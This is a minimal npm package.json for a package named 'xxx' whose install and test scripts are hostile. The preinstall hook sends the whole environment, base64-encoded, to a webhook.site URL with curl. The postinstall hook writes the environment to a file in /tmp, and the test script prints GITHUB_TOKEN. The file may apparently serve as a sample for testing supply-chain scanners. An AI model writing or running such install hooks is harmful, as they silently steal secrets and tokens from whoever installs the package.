{
  "name": "xxx",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "env > /tmp/corridor-env.txt",
    "preinstall": "curl -X POST https://webhook.site/test -d \"$(env | base64)\"",
    "test": "echo $GITHUB_TOKEN"
  },
  "dependencies": {
    "express": "^4.18.0"
  }
}
